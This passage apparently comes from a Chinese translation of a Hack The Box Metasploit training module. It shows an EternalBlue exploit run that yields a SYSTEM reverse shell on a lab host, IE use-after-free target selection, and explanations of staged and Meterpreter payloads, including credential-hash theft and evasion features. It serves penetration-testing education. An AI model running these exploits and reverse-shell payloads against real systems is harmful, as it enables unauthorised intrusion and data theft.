class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.15:4444 </span><br><span class="line">[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] 10.10.10.40:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 10.10.10.40:445 - Connection established for exploitation.</span><br><span class="line">[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)</span><br><span class="line">[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes</span><br><span class="line">[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv</span><br><span class="line">[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      </span><br><span class="line">[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br><span class="line">[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 10.10.10.40:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 10.10.10.40:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 10.10.10.40:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 10.10.10.40:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 10.10.10.40:445 - Receiving response from exploit packet</span><br><span class="line">[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 10.10.10.40:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 10.10.10.40:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Command shell session 1 opened (10.10.14.15:4444 -&gt; 10.10.10.40:49158) at 2020-08-13 21:37:21 +0000</span><br><span class="line">[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter&gt; shell</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure><p>我们现在在目标机器上有一个 shell，我们可以与它交互。</p><h4 id="MSF-目标交互"><a href="#MSF-目标交互" class="headerlink" title="MSF - 目标交互"></a>MSF - 目标交互</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt; whoami</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure><p>这是一个如何<code>msfconsole</code>快速提供帮助的快速而肮脏的示例，但却是该框架如何工作的一个很好的示例。只需要一个模块，没有任何<code>payload</code>选择，<code>encoding</code>或者<code>pivoting</code>在会话或作业之间。</p><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p><code>Targets</code>是从那些特定操作系统的版本中获取的唯一操作系统标识符，这些操作系统使选定的漏洞利用模块可以在该特定版本的操作系统上运行。在漏洞利用模块视图中发出的命令<code>show targets</code>将显示该特定漏洞利用的所有可用漏洞目标，而在根菜单中发出相同的命令，在任何选定的漏洞利用模块之外，将让我们知道我们需要首先选择一个漏洞利用模块。</p><h4 id="MSF-显示目标"><a href="#MSF-显示目标" class="headerlink" title="MSF - 显示目标"></a>MSF - 显示目标</h4><p> MSF - 显示目标</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; show targets</span><br><span class="line"></span><br><span class="line">[-] No exploit module selected.</span><br></pre></td></tr></table></figure><p>当查看我们之前的漏洞利用模块时，这将是我们看到的：</p><p> MSF - 显示目标</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; options</span><br><span class="line"></span><br><span class="line">   Name                  Current Setting                          Required  Description</span><br><span class="line">   ----                  ---------------                          --------  -----------</span><br><span class="line">   DBGTRACE              false                                    yes       Show extra debug trace info</span><br><span class="line">   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction</span><br><span class="line">   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)</span><br><span class="line">   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check</span><br><span class="line">                         rdlists/named_pipes.txt</span><br><span class="line">   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework</span><br><span class="line">                                                                            /wiki/Using-Metasploit</span><br><span class="line">   RPORT                 445                                      yes       The Target port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                                           no        The service display name</span><br><span class="line">   SERVICE_NAME                                                   no        The service name</span><br><span class="line">   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no</span><br><span class="line">                                                                            rmal read/write folder share</span><br><span class="line">   SMBDomain             .                                        no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass                                                        no        The password for the specified username</span><br><span class="line">   SMBUser                                                        no        The username to authenticate as</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br></pre></td></tr></table></figure><h3 id="选择目标"><a href="#选择目标" class="headerlink" title="选择目标"></a>选择目标</h3><p>我们可以看到这种类型的攻击只有一种通用类型的目标集。如果我们将漏洞利用模块更改为需要更具体目标范围的东西会怎样？以下漏洞利用的目的是：</p><ul><li><code>MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability</code>.</li></ul><p>如果我们想了解更多关于这个特定模块的信息以及它背后的漏洞是干什么的，我们可以使用命令<code>info</code>。当我们不确定不同漏洞利用或辅助模块的来源或功能时，此命令可以帮助我们。请记住，审核我们的代码以获取任何工件生成或“附加功能”始终被认为是最佳实践，该<code>info</code>命令应该是我们在使用新模块时采取的首要步骤之一。通过这种方式，我们可以熟悉漏洞利用功能，同时确保为我们的客户和我们提供安全、干净的工作环境。</p><h4 id="MSF-目标选择"><a href="#MSF-目标选择" class="headerlink" title="MSF - 目标选择"></a>MSF - 目标选择</h4><p> MSF - 目标选择</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; info</span><br><span class="line"></span><br><span class="line">       Name: MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability </span><br><span class="line">     Module: exploit/windows/browser/ie_execcommand_uaf</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: </span><br><span class="line"> Privileged: No</span><br><span class="line">    License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Good</span><br><span class="line">  Disclosed: 2012-09-14</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  unknown</span><br><span class="line">  eromang</span><br><span class="line">  binjo</span><br><span class="line">  sinn3r &lt;sinn3r@metasploit.com&gt;</span><br><span class="line">  juan vazquez &lt;juan.vazquez@metasploit.com&gt;</span><br><span class="line"></span><br><span class="line">Available targets:</span><br><span class="line">  Id  Name</span><br><span class="line">  --  ----</span><br><span class="line">  0   Automatic</span><br><span class="line">  1   IE 7 on Windows XP SP3</span><br><span class="line">  2   IE 8 on Windows XP SP3</span><br><span class="line">  3   IE 7 on Windows Vista</span><br><span class="line">  4   IE 8 on Windows Vista</span><br><span class="line">  5   IE 8 on Windows 7</span><br><span class="line">  6   IE 9 on Windows 7</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  No</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name       Current Setting  Required  Description</span><br><span class="line">  ----       ---------------  --------  -----------</span><br><span class="line">  OBFUSCATE  false            no        Enable JavaScript obfuscation</span><br><span class="line">  SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0</span><br><span class="line">  SRVPORT    8080             yes       The local port to listen on.</span><br><span class="line">  SSL        false            no        Negotiate SSL for incoming connections</span><br><span class="line">  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line">  URIPATH                     no        The URI to use for this exploit (default is random)</span><br><span class="line"></span><br><span class="line">Payload information:</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This module exploits a vulnerability found in Microsoft Internet </span><br><span class="line">  Explorer (MSIE). When rendering an HTML page, the CMshtmlEd object </span><br><span class="line">  gets deleted in an unexpected manner, but the same memory is reused </span><br><span class="line">  again later in the CMshtmlEd::Exec() function, leading to a </span><br><span class="line">  use-after-free condition. Please note that this vulnerability has </span><br><span class="line">  been exploited since Sep 14, 2012. Also, note that </span><br><span class="line">  presently, this module has some target dependencies for the ROP </span><br><span class="line">  chain to be valid. For WinXP SP3 with IE8, msvcrt must be present </span><br><span class="line">  (as it is by default). For Vista or Win7 with IE8, or Win7 with IE9, </span><br><span class="line">  JRE 1.6.x or below must be installed (which is often the case).</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  https://cvedetails.com/cve/CVE-2012-4969/</span><br><span class="line">  OSVDB (85532)</span><br><span class="line">  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2012/MS12-063</span><br><span class="line">  http://technet.microsoft.com/en-us/security/advisory/2757760</span><br><span class="line">  http://eromang.zataz.com/2012/09/16/zero-day-season-is-really-not-over-yet/</span><br></pre></td></tr></table></figure><p>查看描述，我们可以大致了解此漏洞利用将为我们完成什么。牢记这一点，我们接下来要检查哪些版本容易受到此漏洞的攻击。</p><p> MSF - 目标选择</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/browser/ie_execcommand_uaf):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   OBFUSCATE  false            no        Enable JavaScript obfuscation</span><br><span class="line">   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0</span><br><span class="line">   SRVPORT    8080             yes       The local port to listen on.</span><br><span class="line">   SSL        false            no        Negotiate SSL for incoming connections</span><br><span class="line">   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line">   URIPATH                     no        The URI to use for this exploit (default is random)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; show targets</span><br><span class="line"></span><br><span class="line">Exploit targets:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line">   1   IE 7 on Windows XP SP3</span><br><span class="line">   2   IE 8 on Windows XP SP3</span><br><span class="line">   3   IE 7 on Windows Vista</span><br><span class="line">   4   IE 8 on Windows Vista</span><br><span class="line">   5   IE 8 on Windows 7</span><br><span class="line">   6   IE 9 on Windows 7</span><br></pre></td></tr></table></figure><p>我们看到了不同版本的 Internet Explorer 和各种 Windows 版本的选项。保留选择将<code>Automatic</code>让 msfconsole 知道它需要在发起成功攻击之前对给定目标执行服务检测。</p><p>但是，如果我们知道我们的目标上运行的是什么版本，我们可以使用该<code>set target &lt;index no.&gt;</code>命令从列表中选择一个目标。</p><p> MSF - 目标选择</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; show targets</span><br><span class="line"></span><br><span class="line">Exploit targets:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line">   1   IE 7 on Windows XP SP3</span><br><span class="line">   2   IE 8 on Windows XP SP3</span><br><span class="line">   3   IE 7 on Windows Vista</span><br><span class="line">   4   IE 8 on Windows Vista</span><br><span class="line">   5   IE 8 on Windows 7</span><br><span class="line">   6   IE 9 on Windows 7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; set target 6</span><br><span class="line"></span><br><span class="line">target =&gt; 6</span><br></pre></td></tr></table></figure><h3 id="目标类型"><a href="#目标类型" class="headerlink" title="目标类型"></a>目标类型</h3><p>目标类型多种多样。每个目标都可能因服务包、操作系统版本甚至语言版本而异。这完全取决于目标或漏洞利用模块中的返回地址和其他参数。</p><p>返回地址可能会有所不同，因为特定的语言包更改了地址，有不同的软件版本可用，或者地址因挂钩而移动。这完全取决于识别目标所需的返回地址类型。该地址可以是<code>jmp esp</code>，跳转到标识目标的特定寄存器，或<code>pop/pop/ret</code>. 有关返回地址主题的更多信息，请参阅<a href="https://academy.hackthebox.com/module/89/section/931">Windows x86</a>模块上基于堆栈的缓冲区溢出。利用模块代码中的注释可以帮助我们确定目标的定义。</p><p>要正确识别目标，我们需要：</p><ul><li>获取目标二进制文件的副本</li><li>使用 msfpescan 找到合适的返回地址</li></ul><p>在本模块的后面，我们将更深入地研究漏洞利用开发、有效负载生成和目标识别。</p><h2 id="有效载荷"><a href="#有效载荷" class="headerlink" title="有效载荷"></a>有效载荷</h2><p>Metasploit 中的A<code>Payload</code>指的是帮助漏洞利用模块（通常）将 shell 返回给攻击者的模块。有效载荷与漏洞本身一起发送，以绕过易受攻击服务的标准功能程序 ( <code>exploits job</code>)，然后在目标操作系统上运行，通常向攻击者返回反向连接并建立立足点 ( <code>payload&#39;s job</code>)。</p><p>Metasploit 框架中有三种不同类型的有效载荷模块：Singles、Stagers 和 Stages。使用三种有效载荷交互类型将被证明对渗透测试者有益。它可以提供我们执行某些类型任务所需的灵活性。有效载荷是否暂存由<code>/</code>有效载荷名称表示。</p><p>例如，<code>windows/shell_bind_tcp</code>是一个没有阶段的单个有效载荷，而<code>windows/shell/bind_tcp</code>由一个 stager ( <code>bind_tcp</code>) 和一个阶段 ( <code>shell</code>) 组成。</p><h3 id="Singles"><a href="#Singles" class="headerlink" title="Singles"></a>Singles</h3><p>有效负载<code>Single</code>包含所选任务的漏洞和整个 shellcode。内联有效载荷在设计上比同类有效载荷更稳定，因为它们包含所有内容。然而，一些漏洞利用将不支持这些有效负载的最终大小，因为它们可能会变得非常大。<code>Singles</code>是独立的有效载荷。它们是在目标系统上发送和执行的唯一对象，运行后立即得到结果。单个有效负载可以像将用户添加到目标系统或启动进程一样简单。</p><h3 id="stager"><a href="#stager" class="headerlink" title="stager"></a>stager</h3><p><code>Stager</code>payloads 与 Stage payloads 一起工作来执行特定的任务。一个 Stager 在攻击者机器上等待，准备在该阶段在远程主机上完成运行后与受害主机建立连接。<code>Stagers</code>通常用于在攻击者和受害者之间建立网络连接，并且设计得小巧可靠。Metasploit 将使用最好的一个，并在必要时退回到不太喜欢的那个。</p><p>Windows NX 与 NO-NX Stagers</p><ul><li>NX CPU 和 DEP 的可靠性问题</li><li>NX stagers 更大（VirtualAlloc 内存）</li><li>现在默认为 NX + Win7 兼容</li></ul><h3 id="stages"><a href="#stages" class="headerlink" title="stages"></a>stages</h3><p><code>Stages</code>是由 stager 的模块下载的有效负载组件。各种有效负载阶段提供没有大小限制的高级功能，例如 Meterpreter、VNC 注入等。有效载荷阶段自动使用中间阶段：</p><ul><li>一个单一的<code>recv()</code>失败与大的有效载荷</li><li>Stager 接收中间 stager</li><li>中间的 Stager 然后执行完整的下载</li><li>对 RWX 也更好</li></ul><h2 id="分阶段有效载荷"><a href="#分阶段有效载荷" class="headerlink" title="分阶段有效载荷"></a>分阶段有效载荷</h2><p>简单地说，分阶段有效载荷是一种<code>exploitation process</code>模块化且功能分离的有效载荷，有助于将其完成的不同功能隔离到不同的代码块中，每个代码块单独完成其目标，但致力于将攻击链接在一起。如果所有阶段都正常工作，这最终将授予攻击者远程访问目标机器的权限。</p><p>与任何其他有效负载一样，除了授予对目标系统的 shell 访问权限外，此有效负载的范围应尽可能紧凑和不显眼，以尽可能地帮助防病毒 () &#x2F; 入侵防御系统 () 规避<code>AV</code>。<code>IPS</code></p><p><code>Stage0</code>分段有效载荷的一部分表示通过网络发送到目标机器易受攻击的服务的初始 shellcode，其唯一目的是初始化与攻击者机器的连接。这就是所谓的反向连接。作为 Metasploit 用户，我们会遇到这些通用名称<code>reverse_tcp</code>、<code>reverse_https</code>和<code>bind_tcp</code>。例如，在<code>show payloads</code>命令下，您可以查找如下所示的有效负载：</p><h4 id="MSF-分阶段有效载荷"><a href="#MSF-分阶段有效载荷" class="headerlink" title="MSF - 分阶段有效载荷"></a>MSF - 分阶段有效载荷</h4><p> MSF - 分阶段有效载荷</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; show payloads</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">535  windows/x64/meterpreter/bind_ipv6_tcp                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager</span><br><span class="line">536  windows/x64/meterpreter/bind_ipv6_tcp_uuid                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support</span><br><span class="line">537  windows/x64/meterpreter/bind_named_pipe                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager</span><br><span class="line">538  windows/x64/meterpreter/bind_tcp                                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager</span><br><span class="line">539  windows/x64/meterpreter/bind_tcp_rc4                                 normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">540  windows/x64/meterpreter/bind_tcp_uuid                                normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)</span><br><span class="line">541  windows/x64/meterpreter/reverse_http                                 normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)</span><br><span class="line">542  windows/x64/meterpreter/reverse_https                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)</span><br><span class="line">543  windows/x64/meterpreter/reverse_named_pipe                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager</span><br><span class="line">544  windows/x64/meterpreter/reverse_tcp                                  normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager</span><br><span class="line">545  windows/x64/meterpreter/reverse_tcp_rc4                              normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">546  windows/x64/meterpreter/reverse_tcp_uuid                             normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)</span><br><span class="line">547  windows/x64/meterpreter/reverse_winhttp                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)</span><br><span class="line">548  windows/x64/meterpreter/reverse_winhttps                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>​反向连接不太可能触发预防系统，例如初始化连接的是受害者主机，该主机大部分时间驻留在所谓的<code>security trust zone</code>. 然而，当然，网络的安全设备和人员不会盲目地遵循这种信任策略，因此即使是在这一步，攻击者也必须谨慎行事。</p><p>​Stage0 代码还旨在在到达后将更大的后续有效负载读入内存。在攻击者和受害者之间建立稳定的通信通道后，攻击者机器很可能会发送一个更大的有效载荷阶段，这应该授予他们 shell 访问权限。这个更大的有效载荷将是<code>Stage1</code>有效载荷。我们将在后面的部分中进行更详细的介绍。</p><h4 id="Meterpreter-载荷"><a href="#Meterpreter-载荷" class="headerlink" title="Meterpreter 载荷"></a>Meterpreter 载荷</h4><p>有效载荷<code>Meterpreter</code>是一种特定类型的多面有效载荷，用于<code>DLL injection</code>确保与受害主机的连接稳定，难以通过简单检查检测到，并在重启或系统更改后保持不变。Meterpreter 完全驻留在远程主机的内存中，不会在硬盘上留下任何痕迹，因此很难用传统的取证技术进行检测。此外，脚本和插件可以<code>loaded and unloaded</code>根据需要动态配置。</p><p>一旦执行了 Meterpreter 负载，就会创建一个新会话，它会生成 Meterpreter 接口。它与 msfconsole 界面非常相似，但所有可用的命令都是针对目标系统的，有效负载已“感染”该系统。它为我们提供了大量有用的命令，从击键捕获、密码哈希收集、麦克风窃听和屏幕截图到模拟进程安全令牌。我们将在后面的部分中深入研究有关 Meterpreter 的更多细节。</p><p>使用 Meterpreter，我们还可以<code>load</code>在不同的 Plugins 中协助我们进行评估。我们将在本模块的插件部分详细讨论这些内容。</p><h2 id="搜索有效载荷"><a href="#搜索有效载荷" class="headerlink" title="搜索有效载荷"></a>搜索有效载荷</h2><p>​要选择我们的第一个有效载荷，我们需要知道我们想在目标机器上做什么。例如，如果我们要访问持久化，我们可能会想要选择一个 Meterpreter 负载。</p><p>如上所述，Meterpreter 有效负载为我们提供了极大的灵活性。它们的基本功能已经非常广泛且具有影响力。我们可以自动化并快速交付与渗透测试的<a href="https://github.com/gentilkiwi/mimikatz">GentilKiwi 的 Mimikatz 插件</a>等插件相结合的部分，同时保持有组织、高效的评估。要查看所有可用的有效负载，请使用<code>show payloads</code>中的命令<code>msfconsole</code>。</p><h4 id="MSF-列出有效载荷"><a href="#MSF-列出有效载荷" class="headerlink" title="MSF - 列出有效载荷"></a>MSF - 列出有效载荷</h4><p> MSF - 列出有效载荷</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; show payloads</span><br><span class="line"></span><br><span class="line">Payloads</span><br><span class="line">========</span><br><span class="line"></span><br><span class="line">   #    Name                                                Disclosure Date  Rank    Check  Description</span><br><span class="line">-    ----                                                ---------------  ----    -----  -----------</span><br><span class="line">   0    aix/ppc/shell_bind_tcp                                               manual  No     AIX Command Shell, Bind TCP Inline</span><br><span class="line">   1    aix/ppc/shell_find_port                                              manual  No     AIX Command Shell, Find Port Inline</span><br><span class="line">   2    aix/ppc/shell_interact                                               manual  No     AIX execve Shell for inetd</span><br><span class="line">   3    aix/ppc/shell_reverse_tcp                                            manual  No     AIX Command Shell, Reverse TCP Inline</span><br><span class="line">   4    android/meterpreter/reverse_http                                     manual  No     Android Meterpreter, Android Reverse HTTP Stager</span><br><span class="line">   5    android/meterpreter/reverse_https                                    manual  No     Android Meterpreter, Android Reverse HTTPS Stager</span><br><span class="line">   6    android/meterpreter/reverse_tcp                                      manual  No     Android Meterpreter, Android Reverse TCP Stager</span><br><span class="line">   7    android/meterpreter_reverse_http                                     manual  No     Android Meterpreter Shell, Reverse HTTP Inline</span><br><span class="line">   8    android/meterpreter_reverse_https                                    manual  No     Android Meterpreter Shell, Reverse HTTPS Inline</span><br><span class="line">   9    android/meterpreter_reverse_tcp                                      manual  No     Android Meterpreter Shell, Reverse TCP Inline</span><br><span class="line">   10   android/shell/reverse_http                                           manual  No     Command Shell, Android Reverse HTTP Stager</span><br><span class="line">   11   android/shell/reverse_https                                          